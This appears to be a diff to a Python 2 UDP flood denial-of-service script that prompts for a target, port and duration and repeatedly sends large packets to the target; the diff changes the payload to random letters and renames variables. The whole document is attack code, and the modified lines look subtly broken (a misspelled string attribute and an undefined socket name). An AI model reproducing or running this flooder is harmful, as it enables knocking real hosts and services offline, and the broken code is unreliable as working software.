@@ -1,4 +1,4 @@
-import socket, sys, os, time, itertools, threading, speech, console, argparse
+import socket, sys, os, time, itertools, threading, speech, console, argparse, string
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-d", "--daemon",help="Starts Daemon DOS",action="store_true")
@@ -112,9 +112,9 @@ if args.rainbow:
 	console.set_color(130, 0, 0)
 	print "     -+--=:=-  -++-  -=:=--+-\n"
 	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	bytes = random._urandom(1024) * args.strength
-	victim = raw_input(' -+- Target: ')
-	vport = input(' -+- Port: ')
+	data = "".join(random.sample(string.ascii_letter*200,1024) * args.strength)
+	target = raw_input(' -+- Target: ')
+	port = input(' -+- Port: ')
 	duration = input(' -+- Run: ')
 	console.set_color()
 	print ""
@@ -132,11 +132,11 @@ if args.rainbow:
 			console.set_color()
 			sys.exit()
 		try:
-			client.sendto(bytes, (victim, vport))
-			client.sendto(bytes, (victim, vport))
-			client.sendto(bytes, (victim, vport))
-			client.sendto(bytes, (victim, vport))
-			client.sendto(bytes, (victim, vport))
+			s.sendto(data, (target, port))
+			s.sendto(data, (target, port))
+			s.sendto(data, (target, port))
+			s.sendto(data, (target, port))
+			s.sendto(data, (target, port))
 		except:
 			pass
 		sent = sent + 5
